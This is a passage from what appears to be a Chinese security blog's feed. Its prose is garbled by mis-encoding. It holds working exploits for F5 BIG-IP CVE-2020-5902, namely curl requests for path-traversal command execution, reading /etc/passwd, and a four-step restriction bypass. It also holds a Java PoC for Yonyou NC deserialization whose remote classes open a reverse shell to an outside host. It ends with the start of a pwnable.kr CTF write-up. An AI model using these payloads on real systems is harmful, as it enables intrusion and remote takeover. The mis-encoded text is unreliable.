href="https://clouddocs.f5.com/cli/tmsh-reference/v13/commands/" target="_blank" rel="noopener">TMSH ÂëΩ‰ª§ÂèÇËÄÉ</a></p><pre class=" language-shell"><code class="language-shell">curl -k 'https://[HOST]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'</code></pre><p>P.S. ÂÆûÈôÖËøôÈáåÁöÑ RCE Âú®Ê≤°ÁªïËøáÈôêÂà∂‰πãÂâçÂè™ÊòØÂØπ‰∫é F5 ÊâßË°åÈÉ®ÂàÜÊìç‰ΩúÔºõÂè¶Â§ñËØ¥<code>list auth user admin</code>ËøîÂõûÁªìÊûú‰∏∫Á©∫ÔºåÈÇ£ÊòØÂõ†‰∏∫ admin Â§Ñ‰∫éÊú™ÁôªÂΩïÁä∂ÊÄÅ„ÄÇ</p><p>LFR:</p><pre class=" language-shell"><code class="language-shell">curl -k 'https://[HOST]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'</code></pre><p>DIRÔºö</p><pre class=" language-shell"><code class="language-shell">curl -k 'https://[HOST]/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/usr/local/'</code></pre><p>‚Ä¶</p><h2 id="RCE-ÈôêÂà∂ÁªïËøá"><a href="#RCE-ÈôêÂà∂ÁªïËøá" class="headerlink" title="RCE ÈôêÂà∂ÁªïËøá"></a>RCE ÈôêÂà∂ÁªïËøá</h2><h3 id="ÂéüÁêÜ"><a href="#ÂéüÁêÜ" class="headerlink" title="ÂéüÁêÜ"></a>ÂéüÁêÜ</h3><p>Êù•Ëá™‰∏çÁü•Ê∫êÂàÜ‰∫´</p><ol><li><p>‰øÆÊîπaliasÂä´ÊåÅlistÂëΩ‰ª§‰∏∫bash</p><pre class=" language-http"><code class="language-http">/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash</code></pre></li><li><p>ÂÜôÂÖ•bashÊñá‰ª∂</p><pre class=" language-http"><code class="language-http">/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/xxx&amp;content=id</code></pre></li><li><p>ÊâßË°åbashÊñá‰ª∂</p><pre class=" language-http"><code class="language-http">/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/xxx</code></pre></li><li><p>ËøòÂéülistÂëΩ‰ª§</p><pre class=" language-http"><code class="language-http">/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list</code></pre></li></ol><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p><a href="https://github.com/rapid7/metasploit-framework/pull/13807/commits/0417e88ff24bf05b8874c953bd91600f10186ba4" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/pull/13807/commits/0417e88ff24bf05b8874c953bd91600f10186ba4</a></p><h2 id="‰øÆË°•¬∑ÂèçÂ∫èÂàóÂåñÁªïËøá"><a href="#‰øÆË°•¬∑ÂèçÂ∫èÂàóÂåñÁªïËøá" class="headerlink" title="..;‰øÆË°•¬∑ÂèçÂ∫èÂàóÂåñÁªïËøá"></a><code>..;</code>‰øÆË°•¬∑ÂèçÂ∫èÂàóÂåñÁªïËøá</h2><p>ÂéüÁêÜÔºö<a href="https://www.criticalstart.com/f5-big-ip-remote-code-execution-exploit/" target="_blank" rel="noopener">https://www.criticalstart.com/f5-big-ip-remote-code-execution-exploit/</a><br>POCÔºö<a href="https://github.com/Critical-Start/Team-Ares/blob/master/CVE-2020-5902/" target="_blank" rel="noopener">https://github.com/Critical-Start/Team-Ares/blob/master/CVE-2020-5902/</a></p><h2 id="ÂèÇËÄÉËµÑÊñô"><a href="#ÂèÇËÄÉËµÑÊñô" class="headerlink" title="ÂèÇËÄÉËµÑÊñô"></a>ÂèÇËÄÉËµÑÊñô</h2><ol><li><a href="https://nosec.org/home/detail/4501.html" target="_blank" rel="noopener">„ÄêÂÆâÂÖ®ÈÄöÊä•„ÄëF5 BIG-IP ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;..;&lt;/code&gt; ? :)&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="F5" scheme="https://blog.sari3l.com/tags/F5/"/>
    
      <category term="CVE-2020-5902" scheme="https://blog.sari3l.com/tags/CVE-2020-5902/"/>
    
  </entry>
  
  <entry>
    <title>Áî®ÂèãNCÂèçÂ∫èÂàóÂåñ ÁÆÄÂçïÂàÜÊûê</title>
    <link href="https://blog.sari3l.com/posts/608d18f0/"/>
    <id>https://blog.sari3l.com/posts/608d18f0/</id>
    <published>2020-06-17T05:21:18.000Z</published>
    <updated>2020-07-06T09:45:04.075Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Áî±‰∫é‰º†Êí≠„ÄÅÂà©Áî®Ê≠§ÊñáÊâÄÊèê‰æõÁöÑ‰ø°ÊÅØËÄåÈÄ†ÊàêÁöÑ‰ªª‰ΩïÁõ¥Êé•ÊàñËÄÖÈó¥Êé•ÁöÑÂêéÊûúÂèäÊçüÂ§±ÔºåÂùáÁî±‰ΩøÁî®ËÄÖÊú¨‰∫∫Ë¥üË¥£ÔºåÊñáÁ´†‰ΩúËÄÖ‰∏ç‰∏∫Ê≠§ÊâøÊãÖ‰ªª‰ΩïË¥£‰ªª„ÄÇ</p></blockquote><h2 id="ÂáÜÂ§á"><a href="#ÂáÜÂ§á" class="headerlink" title="ÂáÜÂ§á"></a>ÂáÜÂ§á</h2><h3 id="jwdp"><a href="#jwdp" class="headerlink" title="jwdp"></a>jwdp</h3><p>UClient Êèê‰æõ‰∫Ü JVM ÂèÇÊï∞ËÆæÁΩÆÔºåÂú®ÈáåÈù¢Áõ¥Êé•Ê∑ªÂä†</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/608d18f0/15923660011340.jpg" alt="-w919"></p><p>ÊàñËÄÖÂú®ÂÖ∂ÁõÆÂΩï‰∏ãÁöÑ client.sec ‰∏≠Áõ¥Êé•‰øÆÊîπ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/608d18f0/15923662221799.jpg" alt="-w1021"></p><h3 id="ÁõÆÊ†á"><a href="#ÁõÆÊ†á" class="headerlink" title="ÁõÆÊ†á"></a>ÁõÆÊ†á</h3><p>Ê≥®ÔºöÊú¨ÊñáÂè™ÊµãËØï‰∫Ü6.5ÁâàÊú¨</p><p>fofaÔºö<a href="https://fofa.so/result?qbase64=dGl0bGU9IllPTllPVSBOQyI%3D" target="_blank" rel="noopener">title=‚ÄùYONYOU NC‚Äù</a></p><h2 id="ÂàÜÊûê"><a href="#ÂàÜÊûê" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h2><p>ÈÄöËøáÂ∑≤ÊúâÁöÑËµÑÊñôÔºåÂú®nc.login.ui.LoginAssistant‰∏≠Êúâ‰ª•‰∏ã‰∏§ÁÇπË∞ÉÁî®lookup</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/608d18f0/15923664561365.jpg" alt="-w1009"></p><p>ÊúÄÁªàÁî±nc.bs.framework.rmi.RmiNCLocator#lookupÔºåÊ≥®ÊÑèÂà∞ÊòØ remoteContextÔºåÊâÄ‰ª•ËøôÈáåÊòØÁ±ª‰ºº RMI Âà©Áî®‰∏≠ÁöÑ <strong>Client ÈÄöËøáÂêë RMI Registry Áî≥ËØ∑ lookup Êìç‰ΩúËøõË°åÂ∫èÂàóÂåñÊîªÂáª</strong></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/608d18f0/15923665837519.jpg" alt="-w692"></p><p>ÂêéÈù¢Â∞±ËøõÂÖ•Âà∞Â∏∏ËßÑÊìç‰Ωú‰∫ÜÔºåÊúÄÂêéÊîæ‰∏ãË∞ÉÁî®Ê†à</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/608d18f0/15923679776836.jpg" alt="-w553"></p><p>Ê≥®ÊÑèÔºåÂà©Áî®Êó∂ÂÄôÈ¶ñÂÖàÁ°ÆÂÆöÊúçÂä°Âô® jdk ÁâàÊú¨Êù•Á°ÆÂÆö payloadÔºåÂèØ‰ª•Áõ¥Êé•ÂÖàÊâìÂêë ceye Êàñ dnslog.cnÔºåÂú®UA‰∏≠‰ºöÊ†áÊòéÁâàÊú¨</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/608d18f0/15923716683106.jpg" alt="-w1453"></p><h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> nc<span class="token punctuation">.</span>bs<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>common<span class="token punctuation">.</span>NCLocator<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Properties<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">poc</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">attack</span><span class="token punctuation">(</span>String url<span class="token punctuation">,</span> String jndipath<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Properties env <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>url<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"http"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            url <span class="token operator">=</span> <span class="token string">"http://"</span> <span class="token operator">+</span> url<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"SERVICEDISPATCH_URL"</span><span class="token punctuation">,</span> url <span class="token operator">+</span> <span class="token string">"/ServiceDispatcherServlet"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        NCLocator locator <span class="token operator">=</span> NCLocator<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span>        locator<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>jndipath<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">attack</span><span class="token punctuation">(</span><span class="token string">"http://target"</span><span class="token punctuation">,</span> <span class="token string">"ldap://ip:port/classname"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>ËøúÁ®ãÁºñËØëÈÉ®ÁΩ≤</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>Context<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>Name<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>spi<span class="token punctuation">.</span>ObjectFactory<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializable<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Hashtable<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">remote</span> <span class="token keyword">implements</span> <span class="token class-name">ObjectFactory</span><span class="token punctuation">,</span> Serializable <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token function">remote</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span><span class="token punctuation">{</span>            java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"sh -i >&amp; /dev/tcp/ip/port 0>&amp;1"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Object <span class="token function">getObjectInstance</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">,</span> Name name<span class="token punctuation">,</span> Context nameCtx<span class="token punctuation">,</span> Hashtable<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token operator">></span> environment<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>ÂΩìÁÑ∂‰πüÂèØ‰ª•ÈÄâÊã©Âà©Áî® nc Ëá™Â∏¶ÁöÑÁ±ªËøõË°åËøúÁ®ãÈÉ®ÁΩ≤Âà©Áî®</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> nc<span class="token punctuation">.</span>bs<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>common<span class="token punctuation">.</span>ComponentMetaVO<span class="token punctuation">;</span><span class="token keyword">import</span> nc<span class="token punctuation">.</span>bs<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteAddressSelector<span class="token punctuation">;</span><span class="token keyword">import</span> nc<span class="token punctuation">.</span>bs<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteProxy<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">remote</span> <span class="token keyword">implements</span> <span class="token class-name">RemoteProxy</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token function">remote</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span><span class="token punctuation">{</span>            java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"sh -i >&amp; /dev/tcp/ip/port 0>&amp;1"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Object <span class="token function">getAttribute</span><span class="token punctuation">(</span>String s<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAttribute</span><span class="token punctuation">(</span>String s<span class="token punctuation">,</span> Object o<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> ComponentMetaVO <span class="token function">getComponentMetaVO</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getRetryMax</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setRetryMax</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">long</span> <span class="token function">getRetryInterval</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setRetryInterval</span><span class="token punctuation">(</span><span class="token keyword">long</span> l<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setRemoteAddressSelector</span><span class="token punctuation">(</span>RemoteAddressSelector remoteAddressSelector<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> RemoteAddressSelector <span class="token function">getRemoteAddressSelector</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="ÊïàÊûú"><a href="#ÊïàÊûú" class="headerlink" title="ÊïàÊûú"></a>ÊïàÊûú</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/608d18f0/mov.gif" alt="mov"></p><h2 id="ÂèÇËÄÉËµÑÊñô"><a href="#ÂèÇËÄÉËµÑÊñô" class="headerlink" title="ÂèÇËÄÉËµÑÊñô"></a>ÂèÇËÄÉËµÑÊñô</h2><ol><li><a href="https://nosec.org/home/detail/4472.html" target="_blank" rel="noopener">„ÄêÂÆâÂÖ®ÈÄöÊä•„ÄëÁî®ÂèãNCÂèçÂ∫èÂàóÂåñËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Ê¨†‰∫ÜÂæà‰πÖÔºåÁÆÄÂçïÂàÜÊûê‰∏ã~&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Pwnable.kr ‰πã Toddler&#39;s Bottle</title>
    <link href="https://blog.sari3l.com/posts/d4fb29f2/"/>
    <id>https://blog.sari3l.com/posts/d4fb29f2/</id>
    <published>2020-06-14T14:54:02.000Z</published>
    <updated>2020-07-06T09:45:14.050Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ÂáÜÂ§á"><a href="#ÂáÜÂ§á" class="headerlink" title="ÂáÜÂ§á"></a>ÂáÜÂ§á</h2><ol><li><p>ÂÖ≥‰∫éÂèçÊ±áÁºñÊó∂ÂáΩÊï∞ÊòæÁ§∫ plt </p><ul><li>ÂéüÂõ†Ôºö<a href="https://www.binss.me/blog/plt-and-got/" target="_blank" rel="noopener">PLT‰∏éGOT</a></li><li>Ëß£ÂÜ≥ÊñπÊ°àÔºö<a href="https://reverseengineering.stackexchange.com/questions/19895/radares-aaaa-and-aa-what-does-it-do-exactly" target="_blank" rel="noopener">Radare‚Äôs <code>aaaa</code> and -AA what does it do, exactly?</a></li></ul></li><li><p>Ê≥®ÊÑè pwndbg ÂØπ heap ÂëΩ‰ª§ËøõË°åËøá‰∏ÄÊ¨°Â§ßÊîπÔºåÊúÄÂêé‰∏ÄÊ¨°ËøòÊòì‰ΩøÁî® commit ‰∏∫ fbd2bb3abfc2500aae76d159e23015008e879b8d<br><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15915160149123.jpg" alt="-w878"></p></li></ol><h2 id="1-fd"><a href="#1-fd" class="headerlink" title="1. [fd]"></a>1. [fd]</h2><h3 id="È¢òÁõÆ"><a href="#È¢òÁõÆ" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-c"><code class="language-c">fd@pwnable<span class="token punctuation">:</span><span class="token operator">~</span>$ cat fd<span class="token punctuation">.</span>c<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>argc<span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pass argv[1] a number\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1234</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    len <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"LETMEWIN\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"good job :)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"learn about Linux file IO\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="ÂàÜÊûê"><a href="#ÂàÜÊûê" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>Êàë‰ª¨È¶ñÂÖàÊ≥®ÊÑèÂà∞ read ÂáΩÊï∞ËØ≠Ê≥ïÔºåÊöÇÊó∂Ê≤°ÊâæÂà∞</p><p>Áî±‰∫é fd ‰∏∫‰º†ÂÖ•ÂèØÊéßÔºåÂΩìÊàë‰ª¨Â∞Ü fd=0x0Êó∂ÔºåÂç≥ fd=stdin Êó∂ÔºåÊàë‰ª¨Â∞±ÂèØ‰ª•ÊéßÂà∂ buf ÂÜÖÁöÑÂÜÖÂÆπÔºå‰ªéËÄåÈÄöËøáÂà§Êñ≠Ëé∑Âèñ flag</p><h3 id="Ëß£È¢ò"><a href="#Ëß£È¢ò" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-shell"><code class="language-shell">fd@pwnable:~$ ./fd 4660LETMEWINgood job :)mommy! I think I know what a file descriptor is!!</code></pre><h2 id="2-collision"><a href="#2-collision" class="headerlink" title="2. collision"></a>2. collision</h2><h3 id="È¢òÁõÆ-1"><a href="#È¢òÁõÆ-1" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> hashcode <span class="token operator">=</span> <span class="token number">0x21DD09EC</span><span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token function">check_password</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> p<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span><span class="token operator">*</span> ip <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        res <span class="token operator">+</span><span class="token operator">=</span> ip<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>argc<span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"usage : %s [passcode]\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"passcode length should be 20 bytes\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>hashcode <span class="token operator">==</span> <span class="token function">check_password</span><span class="token punctuation">(</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wrong passcode.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="ÂàÜÊûê-1"><a href="#ÂàÜÊûê-1" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><ol><li>ÈôêÂà∂‰º†ÂÖ•ÂÄº‰∏∫ 20 